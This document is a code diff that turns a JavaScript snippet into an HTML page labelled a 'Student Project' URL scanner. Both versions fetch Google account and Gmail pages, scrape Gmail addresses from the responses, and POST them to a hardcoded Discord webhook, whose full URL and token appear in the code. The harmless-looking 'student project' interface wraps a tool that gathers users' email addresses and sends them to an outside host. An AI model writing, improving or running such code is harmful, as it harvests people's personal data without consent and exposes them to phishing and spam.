@@ -1,38 +1,66 @@
-(async () => {
-  const urls = ["https://accounts.google.com/AccountChooser", "https://mail.google.com/mail/u/0/", "https://myaccount.google.com/", "https://accounts.google.com/signin/v2/usernamerecovery"]; // 
-  const webhookURL = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ"; // 
-  const found = new Set();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Student Project — Improved</title>
+<style>
+  body { font-family: Arial, sans-serif; padding: 2rem; }
+  button { padding: 10px 20px; font-size: 16px; }
+  pre { background: #f4f4f4; padding: 1rem; }
+</style>
+</head>
+<body>
+<h1>Async URL Scanner</h1>
+<button id="startBtn">Start Scan</button>
+<pre id="log"></pre>
 
-  // Scan all URLs in parallel
-  await Promise.all(urls.map(async url => {
-    try {
-      const r = await fetch(url);
-      const text = await r.text();
-      [...text.matchAll(/[a-zA-Z0-9._%+-]+@gmail\.com/g)]
-        .forEach(e => found.add(e[0]));
-    } catch (err) {
-      console.warn(`Failed to fetch ${url}: ${err}`);
-    }
-  }));
+<script>
+const logEl = document.getElementById("log");
+function log(msg) { logEl.textContent += msg + "\n"; }
 
-  if (found.size === 0) {
-    console.log("❌ No Gmail addresses found.");
-  } else {
-    console.log("🔥 Gmail addresses found:");
-    console.table([...found]);
+const targetUrls = [
+  "https://accounts.google.com/AccountChooser",
+  "https://mail.google.com/mail/u/0/",
+  "https://accounts.google.com/signin",
+];
 
-    // Send to Discord
+const webhookURL = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ"; 
+
+async function fetchEmails(url) {
+  try {
+    const res = await fetch(url, { method: "GET" });
+    const text = await res.text();
+    
+    const emails = [...text.matchAll(/[a-zA-Z0-9._%+-]+@gmail\.com/g)].map(m => m[0]);
+    log(`Found ${emails.length} emails at ${url}`);
+    return emails;
+  } catch (err) {
+    log(`Failed to fetch ${url}: ${err.message}`);
+    return [];
+  }
+}
+
+async function scanAllUrls() {
+  log("Starting scan...");
+  const allResults = await Promise.all(targetUrls.map(fetchEmails));
+  const foundEmails = new Set(allResults.flat());
+  log(`Unique emails found: ${foundEmails.size}`);
+
+  if (webhookURL && foundEmails.size > 0) {
     try {
       await fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `Found Gmail addresses:\n${[...found].join("\n")}`
-        })
+        body: JSON.stringify({ content: Array.from(foundEmails) })
       });
-      console.log("✅ Sent to Discord!");
+      log("Sent emails to webhook successfully!");
     } catch (err) {
-      console.error("❌ Failed to send to Discord:", err);
+      log("Webhook send failed: " + err.message);
     }
   }
-})();
+}
+
+document.getElementById("startBtn").addEventListener("click", scanAllUrls);
+</script>
+</body>
+</html>
